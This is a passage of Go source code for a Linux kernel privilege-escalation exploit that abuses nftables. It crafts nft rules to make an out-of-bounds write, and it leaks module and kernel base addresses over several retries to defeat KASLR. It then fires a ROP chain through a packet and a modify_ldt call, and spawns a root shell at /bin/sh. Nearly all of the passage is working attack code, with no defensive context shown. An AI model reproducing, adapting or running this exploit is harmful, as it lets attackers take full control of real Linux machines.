	binary.LittleEndian.PutUint16(ruleLow, offsets[2]+16)

	// rules high u16
	ruleHigh := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleHigh, offsets[3])

	// rules_last low u16
	ruleLastLow := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleLastLow, offsets[4])

	// rules_last high u16
	ruleLastHigh := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleLastHigh, offsets[5])

	// Payload to write lsb of rules pointer
	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: leakChain,
		Exprs: []expr.Any{
			&expr.Immediate{
				Register: 8,
				Data:     chainLow,
			},
			&expr.Immediate{
				Register: 9,
				Data:     chainHigh,
			},
			&expr.Immediate{
				Register: 10,
				Data:     ruleLow,
			},
			&expr.Immediate{
				Register: 11,
				Data:     ruleHigh,
			},
			&expr.Immediate{
				Register: 12,
				Data:     ruleLastLow,
			},
			&expr.Immediate{
				Register: 13,
				Data:     ruleLastHigh,
			},
			&expr.Byteorder{
				SourceRegister: 8,
				DestRegister:   16,
				Op:             expr.ByteorderHton,
				Len:            28,
				Size:           2,
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not add oob write rule: %v", err)
	}

	// Write our ropchain to the network packet and trigger our nft instructions
	packet_ropchain_path(ropchain)

	return nil
}

type ExploitStepFn func(*nftables.Conn, uint64, uint64) error

func nftables_wrapper(handle netns.NsHandle, step ExploitStepFn, moduleBase uint64, kernelBase uint64) error {
	// Open netlink connection
	conn, err := nftables.New(nftables.WithNetNSFd(int(handle)))
	_ = conn

	if err != nil {
		return err
	}

	conn.FlushRuleset()
	defer conn.FlushRuleset()

	err = step(conn, moduleBase, kernelBase)

	if err != nil {
		return err
	}

	return nil
}

func main() {
	// Get cpu count, will be useful for sprays
	rand.Seed(time.Now().UnixNano())

	var origAffinity unix.CPUSet
	origAffinity.Zero()

	err := unix.SchedGetaffinity(0, &origAffinity)

	if err != nil {
		panic(err)
	}

	cpuCount = origAffinity.Count()

	// Lock go routine to specific thread
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Bind to a single cpu to reach same kmalloc slabs
	var cpuSet unix.CPUSet
	cpuSet.Zero()
	cpuSet.Set(0)

	err = unix.SchedSetaffinity(0, &cpuSet)

	if err != nil {
		panic(err)
	}

	if len(os.Args) >= 3 {
		mode := os.Args[1]

		if os.Args[1] != "module_leak" && os.Args[1] != "kernel_leak" && os.Args[1] != "kernel_rop" {
			fmt.Printf("Invalid binary mode: '%v'\n", os.Args[1])
		}

		moduleBase, err := strconv.ParseUint(os.Args[2], 16, 64)

		if err != nil {
			panic(err)
		}

		// Setup the environ
		ns, err := netns.New()

		if err != nil {
			panic(err)
		}

		defer ns.Close()

		// Create new net interface
		err = exec.Command("ip", "addr", "add", "127.0.0.1/8", "dev", "lo").Run()

		if err != nil {
			fmt.Printf("Could not give interface ip")
			return
		}

		err = exec.Command("ip", "link", "set", "lo", "up").Run()

		if err != nil {
			fmt.Printf("Could not up interface")
			return
		}

		if mode == "module_leak" {
			err = nftables_wrapper(ns, leak_module_step, 0, 0)
		} else if mode == "kernel_leak" {
			err = nftables_wrapper(ns, leak_kaslr_step, moduleBase, 0)
		} else {
			if len(os.Args) != 4 {
				fmt.Println("[!] Missing kernel address parameter")
				return
			}

			kernelBase, err := strconv.ParseUint(os.Args[3], 16, 64)

			if err != nil {
				panic(err)
			}

			err = nftables_wrapper(ns, ropchain_step, moduleBase, kernelBase)
		}

		if err != nil {
			fmt.Printf("Error: %v\n", err)
		}
	} else if len(os.Args) == 1 {
		// No arguments, launch the full exploit process
		// First resolve the binary and find the wrapper in the same folder
		binPath, err := os.Readlink("/proc/self/exe")

		if err != nil {
			fmt.Printf("[!] Could not resolve binary path: %v\n", err)
			return
		}

		binFolder := path.Dir(binPath)
		wrapperPath := path.Join(binFolder, "wrapper")

		if unix.Getuid() == 0 {
			fmt.Println("[+] WARNING: Exploit already running as root. For debugging")
		}

		fmt.Println("[+] Recovering module base")
		var moduleBase uint64 = 0x0

		for i := 0; i < 15; i++ {
			moduleLeak := exec.Command(wrapperPath, binPath, "module_leak", "0")
			stdout, err := moduleLeak.Output()

			if err != nil {
				fmt.Printf("[E] Module leak failed: %v\n", err)
				return
			}

			lines := strings.Split(string(stdout), "\n")

			for _, line := range lines {
				if strings.HasPrefix(line, "LEAK") {
					addrStr := strings.Split(line, ":")[1]
					moduleBase, err = strconv.ParseUint(addrStr, 16, 64)

					if err != nil {
						// Should never happen
						panic(err)
					}

					break
				}
			}

			if moduleBase != 0 {
				break
			}

			fmt.Printf("Failed attempt #%v, retrying ...\n", i)
		}

		if moduleBase == 0 {
			fmt.Println("[E] Could not find module base, crashing the kernel :(")
		} else {
			fmt.Printf("[+] Module base: 0x%x\n", moduleBase)
			fmt.Println("[+] Recovering kernel base")
		}

		var kernelBase uint64 = 0

		for i := 0; i < 10; i++ {
			kernelLeak := exec.Command(wrapperPath, binPath, "kernel_leak", strconv.FormatUint(moduleBase, 16))
			stdout, err := kernelLeak.Output()

			if err != nil {
				fmt.Printf("[E] Kernel leak failed: %v\n", err)
				return
			}

			lines := strings.Split(string(stdout), "\n")

			for _, line := range lines {
				if strings.HasPrefix(line, "LEAK") {
					addrStr := strings.Split(line, ":")[1]
					kernelBase, err = strconv.ParseUint(addrStr, 16, 64)

					if err != nil {
						// Should never happen
						panic(err)
					}

					break
				}

			}

			if kernelBase != 0 {
				break
			}

			fmt.Printf("Failed attempt #%v, retrying ...\n", i)
		}

		fmt.Printf("[+] Kernel base: 0x%x\n", kernelBase)

		for {
			kernelLeak := exec.Command(wrapperPath, binPath, "kernel_rop", strconv.FormatUint(moduleBase, 16), strconv.FormatUint(kernelBase, 16))
			err := kernelLeak.Start()

			if err != nil {
				panic(err)
			}

			for {
				// Wait one second so we don't race with the overwriting of the
				// syscall handler
				time.Sleep(1 * time.Second)
				syscall.RawSyscall(unix.SYS_MODIFY_LDT, 0, 0, 0)

				if unix.Getuid() == 0 {
					fmt.Println("[+] Got root !!!")
					unix.Exec("/bin/sh", []string{"/bin/sh"}, os.Environ())
				}
			}
		}

	} else {
		fmt.Println("Invalid arguments")
	}

}
